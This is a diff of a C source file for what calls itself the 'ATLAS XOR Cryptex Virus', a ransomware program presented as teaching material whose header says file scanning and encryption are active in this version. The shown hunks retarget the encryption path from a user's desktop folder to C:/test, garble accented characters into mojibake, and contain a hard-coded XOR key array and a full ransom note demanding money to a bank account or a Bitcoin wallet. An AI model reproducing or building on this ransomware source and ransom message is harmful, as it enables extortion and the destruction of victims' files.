@@ -12,8 +12,8 @@
 	 en combinacion de una pasada XOR combinacional de segunda ronda de una key periodicamente preestablecida con 
 	 claves de coma flotante .
 	 
-	 La funcion de autoreplicación y escaneo de directorios para cifrado automatico de disco esta deshabilitado
-	 por propositos de solo enseñanza de como trabaja un mecanismo semicomplejo de ransomware.
+	 La funcion de autoreplicaciÃ³n y escaneo de directorios para cifrado automatico de disco esta deshabilitado
+	 por propositos de solo enseÃ±anza de como trabaja un mecanismo semicomplejo de ransomware.
 	 
 	 En esta version el escaneo de ficheros en determinados directorios esta activado y cifrara cualquier archivo
 	 en su interior.
@@ -49,7 +49,7 @@ FILE *readme;
 float sharedkey[10] = {0.65,100,0.365,0,25.9,999,5,12.58,7.0214,103.126};
 float precalculated;
 
-char path[] = {"C:/Users/JuanCarlos/Desktop/Networking CCNA-P-IE-Ar"};
+char path[] = {"C:/test"};
 
 struct data_chars {
 	char current_char;
@@ -133,13 +133,13 @@ int main(void)
 					"\t-This is the ATLAS XOR Cryptex Virus-\n"
 					"\t-------------------------------------\n\n\n"
 					"\t------------------------------------------------------------------------------------------\n"
-					"\tSi quieres recuperar tu información Valiosa\n"
+					"\tSi quieres recuperar tu informaciÃ³n Valiosa\n"
 					"\tsolo necesitas depositar 5000 $ USD 4390 Euros\n"
 					"\ten el banco LAFISE en Nicaragua con el numero \n"
 					"\tde cuenta 787562312 con su nombre de instutucion y datos\n"
 					"\tpara poder darte la clave de decifrado o mandar 3.5BTC\n"
 					"\tal siguiente monedero virtual BIgbUh98Sas3&ndfScyiuhIUg454\n\n\n"
-					"\tRecuerda tu Información esta en juego, no aceptar el proceder al pago y tu informacion\n"
+					"\tRecuerda tu InformaciÃ³n esta en juego, no aceptar el proceder al pago y tu informacion\n"
 					"\testara completamente perdida\n"
 					"\t------------------------------------------------------------------------------------------\n\n\n"
 					"\tATLAS\n\n");
